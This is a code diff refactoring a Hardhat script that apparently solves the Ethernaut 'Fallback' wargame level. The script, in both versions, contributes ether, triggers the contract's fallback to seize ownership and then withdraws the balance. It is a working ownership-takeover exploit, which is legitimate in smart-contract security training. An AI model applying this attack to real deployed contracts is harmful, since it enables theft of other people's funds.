@@ -1,34 +1,35 @@
 import { ethers } from "hardhat";
 import { BigNumberish } from "ethers";
 import { Address } from "hardhat-deploy/types";
-import { Fallback } from "../typechain-types/2-Fallback/Fallback";
+import { Fallback } from "../typechain-types";
 
-const delay = (ms: number) => {
-  return new Promise((resolve) => setTimeout(resolve, ms));
-};
+const CONTRACT_ADDRESS: Address = "0x258Afb4b8C8e0004904b2d4e7A522C13783658F1";
+const AMOUNT_TO_SEND: BigNumberish = ethers.utils.parseEther("0.0001");
 
 const main = async () => {
   const [deployer] = await ethers.getSigners();
-  const contractAddress: Address = "0x258Afb4b8C8e0004904b2d4e7A522C13783658F1";
-  const amountToSend: BigNumberish = ethers.utils.parseEther("0.0001")
-  const fallback: Fallback = await ethers.getContractAt("Fallback", contractAddress, deployer);
-  let tx = await fallback.contribute({ value: amountToSend});
-  let status = (await tx.wait()).status === 1;
-  console.log(`Contribute operation successful: ${status}`);
+  const fallback: Fallback = await ethers.getContractAt("Fallback", CONTRACT_ADDRESS, deployer);
 
-  tx = await deployer.sendTransaction({
-    to: contractAddress,
-    value: amountToSend
+  const contributeTx = await fallback.contribute({ value: AMOUNT_TO_SEND });
+  const contributeStatus = (await contributeTx.wait()).status === 1;
+  console.log(`Contribute operation: ${contributeStatus ? '✅' : '❌'}`);
+
+  const sendTx = await deployer.sendTransaction({
+    to: CONTRACT_ADDRESS,
+    value: AMOUNT_TO_SEND
   });
-  status = (await tx.wait()).status === 1;
-  console.log(`Send transaction operation successful: ${status}`);
+  const sendStatus = (await sendTx.wait()).status === 1;
+  console.log(`Send transaction operation: ${sendStatus ? '✅' : '❌'}`);
+
   const isModifiedOwner = deployer.address === await fallback.owner();
-  console.log(`Owner is attacker?? ${isModifiedOwner}`);
-  console.log(`New owner address is: ${await fallback.owner()}`);
+  console.log(`Owner is attacker?? ${isModifiedOwner ? '👾' : '🛡️'}`);
+  console.log(`New owner address is: ${await fallback.owner()} 🆔`);
 
   console.log(`Withdrawing...`);
   await fallback.withdraw();
-  console.log(`Withdrawed`);
+  console.log(`Withdrawed ✅`);
 };
 
-main();
+main().catch(error => {
+  console.error('🚫', error);
+});
